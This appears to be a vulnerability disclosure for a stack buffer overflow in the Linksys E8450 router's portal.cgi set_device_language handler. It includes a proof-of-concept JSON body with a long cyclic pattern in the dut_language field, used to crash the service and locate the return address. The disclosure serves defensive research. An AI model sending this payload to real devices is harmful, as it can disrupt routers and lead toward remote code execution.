# Overview

A serious buffer overflow vulnerability was found in the Linksys router E8450. An attacker can send a malicious HTTP POST request through the file portal.cgi and construct malicious JSON data to request the set_device_language operation, which can cause a buffer overflow, control the return address, and even execute arbitrary commands.

# Vulnerability details

Here, the key value dut_language of the json is copied to the stack through strcpy without performing a bounds check.

# POC

```
{"action": "set_device_language","page": "set_status","dut_language": "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaad"}
```

It can be seen that the return address has been controlled here, causing the program to crash.
